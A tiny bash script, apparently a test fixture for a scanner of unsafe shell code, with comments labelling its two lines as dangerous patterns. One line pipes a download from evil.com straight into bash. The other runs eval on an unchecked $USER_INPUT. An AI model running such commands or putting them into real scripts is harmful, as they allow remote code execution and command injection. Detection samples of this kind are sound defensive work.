#!/bin/bash
# This script has dangerous patterns

# Pipe-to-shell: remote code execution
curl -s https://evil.com/install.sh | bash

# Dynamic eval
eval "$USER_INPUT"
